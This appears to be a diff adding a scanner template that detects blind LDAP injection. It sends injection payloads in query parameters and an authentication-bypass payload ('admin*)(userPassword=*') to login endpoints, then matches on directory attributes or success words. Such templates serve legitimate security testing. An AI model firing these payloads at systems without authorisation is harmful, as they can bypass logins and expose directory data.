@@ -1,0 +1,39 @@
+id: ldap-blind-injection
+info:
+  name: LDAP Blind Injection Detection
+  author: AniipID
+  severity: high
+  description: Detects blind LDAP injection vulnerabilities using boolean-based techniques
+  tags: ldap,injection,blind
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?user=admin)(&)"
+      - "{{BaseURL}}?user=*)(uid=*))(|(uid=*"
+      - "{{BaseURL}}?username=*"
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "cn="
+          - "dn="
+          - "ou="
+          - "dc="
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/authenticate"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin*)(userPassword=*&password=*"
+    matchers:
+      - type: word
+        words:
+          - "Welcome"
+          - "authenticated"
+          - "success"
+        condition: or
